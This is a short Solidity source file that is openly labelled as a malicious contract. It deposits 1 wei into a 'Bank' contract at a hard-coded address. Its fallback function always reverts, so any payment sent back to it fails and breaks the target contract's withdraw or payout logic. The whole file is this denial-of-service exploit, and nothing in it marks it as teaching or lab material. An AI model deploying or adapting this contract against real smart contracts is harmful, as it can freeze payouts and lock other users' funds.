pragma solidity ^0.4.24;

contract Bank{
    function deposit() public payable;
    function withdraw() public;
}

contract Breaker{
    Bank code = Bank(0x4D4121D4a381E2363A2aFeB402fe29918a2581Dd);
    constructor() public payable{
        code.deposit.value(1 wei)();
    }
    //malicious contract to revert payments and break contract.
    function() public payable{
        revert();
    }
}